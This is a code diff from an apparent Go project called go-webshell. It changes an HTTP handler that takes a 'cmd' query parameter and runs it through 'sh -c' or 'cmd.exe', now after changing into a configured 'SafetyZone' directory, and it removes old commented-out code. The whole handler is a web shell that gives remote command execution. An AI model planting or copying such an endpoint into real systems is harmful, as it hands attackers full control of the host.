@@ -3,13 +3,17 @@ package command
 import (
 	"database/sql"
 	"github.com/alexperezortuno/go-webshell/internal/platform/storage/data_base"
+	"github.com/alexperezortuno/go-webshell/tools/environment"
 	"github.com/gin-gonic/gin"
 	"log"
 	"net/http"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
 )
+
+var params = environment.Server()
 
 func CmdHandler() gin.HandlerFunc {
 	return func(ctx *gin.Context) {
@@ -111,6 +115,17 @@ func execute(r *http.Request) (string, error) {
 	cmd := r.URL.Query().Get("cmd")
 	var out []byte
 
+	actualDir, err := os.Getwd()
+	if err != nil {
+		return "", err
+	}
+
+	newDir := params.SafetyZone
+	err = os.Chdir(newDir)
+	if err != nil {
+		return "", err
+	}
+
 	if runtime.GOOS == "windows" {
 		sh := "cmd.exe"
 		out, err := exec.Command(sh, "/K", cmd).Output()
@@ -122,53 +137,16 @@ func execute(r *http.Request) (string, error) {
 	}
 
 	sh := "sh"
-	out, err := exec.Command(sh, "-c", cmd).Output()
+	out, err = exec.Command(sh, "-c", cmd).Output()
 
 	if err != nil {
 		return "", err
 	}
 
+	err = os.Chdir(actualDir)
+	if err != nil {
+		return "", err
+	}
+
 	return string(out), nil
-
-	/*
-		cmd = strings.Split(r.URL.Query("cmd"), " ")
-
-		if len(cmd_str) > 1 {
-			out, _ = exec.Command(cmd[0], cmd[1:]...).Output()
-		} else {
-			out, _ = exec.Command(cmd[0]).Output()
-		}
-
-		fmt.Printf("%s", out)
-
-		return _, nil*/
-
-	//cmd := exec.Command("bash")
-	//log.Println(r.URL.Query().Get("cmd"))
-	//cmd.Stdin = strings.NewReader(r.URL.Query().Get("cmd"))
-	//cmd.Stderr = os.Stderr
-	//stdout, err := cmd.StdoutPipe()
-	//if err != nil {
-	//	return out, err
-	//}
-	//
-	//if err := cmd.Start(); err != nil {
-	//	return out, err
-	//}
-	//
-	//defer cmd.Wait()
-	//
-	//scanner := bufio.NewScanner(stdout)
-	//for scanner.Scan() {
-	//	cmd_str = append(cmd_str, scanner.Text())
-	//	out = append(out, scanner.Bytes()...)
-	//}
-	//
-	//if err := scanner.Err(); err != nil {
-	//	return out, err
-	//}
-	//
-	//fmt.Println(cmd_str)
-	//
-	//return out, nil
 }
